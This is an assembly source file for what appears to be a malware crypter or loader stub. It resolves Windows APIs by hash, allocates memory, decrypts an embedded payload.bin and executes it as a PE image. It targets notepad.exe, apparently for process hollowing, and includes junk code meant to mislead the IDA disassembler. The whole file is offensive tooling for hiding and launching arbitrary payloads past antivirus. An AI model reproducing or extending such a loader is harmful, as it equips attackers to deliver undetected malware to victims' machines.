align 16

%include "macro.asm"

section .data
PEBASE dd RANDOM32 ; Memory offset dest PE
PEB		 dd RANDOM32 ; PEB Location
CTX		 dd RANDOM32 ; 
PIS		 dd RANDOM32 ; Process information structure  
SIS		 dd RANDOM32 ; 
vRPEBASE	dd RANDOM32 ; Will old the PE  base value
PEENTRY dd RANDOM32; PE Entrypoint
PEIMAGEBASE dd RANDOM32 ; Will the PE base value  
PIMAGEBASE dd RANDOM32
PESECTION dw RANDOM16 ; Sections Count
PEZOFIMAGE dd RANDOM32
PEZOFHEADERS dd RANDOM32 
PEOPTHEADER dd RANDOM32
PEBASE2 dd 0 

FILE db 'C:\WINDOWS\system32\notepad.exe',0

%include "payload.inc"
%include "hashs.inc"

section .text
PAYLOAD incbin  "payload.bin"

%include "bbcypher.asm"
%include "dllmgt.asm"
%include "peexec.asm"

%define OBS ; Compiling with or without obfuscation

GLOBAL _start

; ########## MAIN PROGRAM ##############
_start:
	%ifdef OBS
	; Some work for IDA
	cmp	eax,RANDOM16+1	; n'arrive jamais
	jne .ends
	call PAYLOAD + RANDOM8
	cmp	eax,RANDOM32+1
	jne .ends
	call PAYLOAD + RANDOM8 +(EPELEN / 2)
	%endif

.ends

	; Reserve Memory for the PE image
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_VIRTUALALLOC
	mov	ebx, dword[PELEN]
	add	ebx, 1024 + 0x54 + 0x10	; Reserve plus de place pour SIS et PIS
	invokel eax, NULL, ebx, MEM_COMMIT, PAGE_READWRITE
	mov	[PEBASE], eax ; Save memory location

	; Decipher payload
	call _bbdecypher

	call _peexec

.end
	invoke _ExitProcess@4, NULL

	ret

